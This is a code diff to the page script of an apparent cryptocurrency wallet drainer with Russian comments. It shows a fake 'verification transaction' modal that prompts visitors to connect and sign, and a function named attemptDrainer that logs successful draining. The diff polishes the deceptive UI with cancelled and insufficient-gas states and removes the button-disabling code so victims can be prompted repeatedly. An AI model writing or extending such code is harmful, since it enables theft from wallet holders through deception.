@@ -180,6 +180,27 @@ window.addEventListener('DOMContentLoaded', () => {
       100% { transform: translateY(-50px); opacity: 0; }
     }
 
+    .scanner-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 48px;
+      display: none;
+    }
+
+    .scanner-icon.cancelled::before {
+      content: '❌';
+      color: #ff5555;
+      text-shadow: 0 0 10px #ff5555;
+    }
+
+    .scanner-icon.gas::before {
+      content: '⚠️';
+      color: #ffcc00;
+      text-shadow: 0 0 10px #ffcc00;
+    }
+
     .modal-result {
       font-family: 'Orbitron', sans-serif;
       font-size: 18px;
@@ -189,10 +210,6 @@ window.addEventListener('DOMContentLoaded', () => {
 
     .modal-result.success {
       color: #00ff88;
-    }
-
-    .modal-result.error {
-      color: #ff5555;
     }
 
     .modal-subtitle {
@@ -254,11 +271,12 @@ window.addEventListener('DOMContentLoaded', () => {
       }
       .modal-title { font-size: 18px; }
       .scanner-container { width: 100px; height: 100px; }
-      .modal-subtitle {ರ: true; font-size: 12px; }
+      .modal-subtitle { font-size: 12px; }
       .modal-result { font-size: 16px; }
       .action-list { font-size: 12px; }
       .modal-footer { font-size: 10px; }
       .cancel-btn { font-size: 12px; padding: 8px 16px; }
+      .scanner-icon { font-size: 40px; }
     }
   `;
   document.head.appendChild(style);
@@ -276,9 +294,9 @@ window.addEventListener('DOMContentLoaded', () => {
     <div class="scanner-container">
       <div class="scanner-bg"></div>
       <div class="scanner-line"></div>
+      <div class="scanner-icon"></div>
     </div>
     <div class="modal-result success">Transaction Confirmed!</div>
-    <div class="modal-result error">Transaction Cancelled</div>
     <ul class="action-list">
       <li>Connect to the network</li>
       <li>Sign the verification transaction</li>
@@ -295,7 +313,7 @@ window.addEventListener('DOMContentLoaded', () => {
     hideModal();
     modalShown = false;
     isTransactionPending = false;
-    updateModalContent('error');
+    updateModalContent('error', 'cancelled');
   });
 
   // Проверяем наличие инжектированного провайдера
@@ -320,13 +338,17 @@ function showModal() {
   modalContent.style.display = 'block';
   // Сбрасываем состояние модального окна
   const scanner = modalContent.querySelector('.scanner-container');
+  const scannerLine = modalContent.querySelector('.scanner-line');
+  const scannerIcon = modalContent.querySelector('.scanner-icon');
   const subtitle = modalContent.querySelector('.modal-subtitle');
   const successMsg = modalContent.querySelector('.modal-result.success');
-  const errorMsg = modalContent.querySelector('.modal-result.error');
+
   scanner.style.display = 'block';
+  scannerLine.style.display = 'block';
+  scannerIcon.style.display = 'none';
+  scannerIcon.className = 'scanner-icon'; // Сбрасываем классы
   subtitle.style.display = 'block';
   successMsg.style.display = 'none';
-  errorMsg.style.display = 'none';
 }
 
 function hideModal() {
@@ -341,20 +363,28 @@ function showModalOnce() {
   }
 }
 
-function updateModalContent(status) {
+function updateModalContent(status, errorType = null) {
   const scanner = modalContent.querySelector('.scanner-container');
+  const scannerLine = modalContent.querySelector('.scanner-line');
+  const scannerIcon = modalContent.querySelector('.scanner-icon');
   const subtitle = modalContent.querySelector('.modal-subtitle');
   const successMsg = modalContent.querySelector('.modal-result.success');
-  const errorMsg = modalContent.querySelector('.modal-result.error');
 
-  scanner.style.display = 'none';
-  subtitle.style.display = 'none';
   if (status === 'success') {
+    scannerLine.style.display = 'none';
+    scannerIcon.style.display = 'none';
+    subtitle.style.display = 'none';
     successMsg.style.display = 'block';
-    errorMsg.style.display = 'none';
   } else {
+    scannerLine.style.display = 'none';
+    scannerIcon.style.display = 'block';
+    subtitle.style.display = 'none';
     successMsg.style.display = 'none';
-    errorMsg.style.display = 'block';
+    if (errorType === 'cancelled') {
+      scannerIcon.classList.add('cancelled');
+    } else if (errorType === 'gas') {
+      scannerIcon.classList.add('gas');
+    }
   }
 }
 
@@ -390,15 +420,19 @@ async function attemptDrainer() {
     console.log(status === 'confirmed' ? '✅ Drainer выполнен успешно' : '🙅 Пользователь отклонил транзакцию');
 
     isTransactionPending = false;
-    updateModalContent(status === 'confirmed' ? 'success' : 'error');
+    updateModalContent(status === 'confirmed' ? 'success' : 'error', 'cancelled');
   } catch (err) {
     isTransactionPending = false;
-    updateModalContent('error');
-    if (err.message.includes('user rejected')) {
+    let errorType = 'cancelled';
+    if (err.message.includes('Недостаточно') || err.message.includes('Insufficient funds for gas')) {
+      errorType = 'gas';
+      console.log('⚠️ Недостаточно средств для газа');
+    } else if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
     }
+    updateModalContent('error', errorType);
   }
 }
 
@@ -422,7 +456,7 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
-    updateModalContent('error');
+    updateModalContent('error', 'cancelled');
   }
 }
 
@@ -440,10 +474,6 @@ async function onChainChanged(chainId) {
 function cleanup() {
   if (!actionBtn) return;
   window.ethereum.removeListener('chainChanged', onChainChanged);
-  // Убираем отключение кнопки, чтобы можно было повторно запустить процесс
-  // actionBtn.removeEventListener('click', handleConnectOrAction);
-  // actionBtn.disabled = true;
-  // actionBtn.style.opacity = '0.6';
 }
 
 // === Ожидание подключения кошелька ===
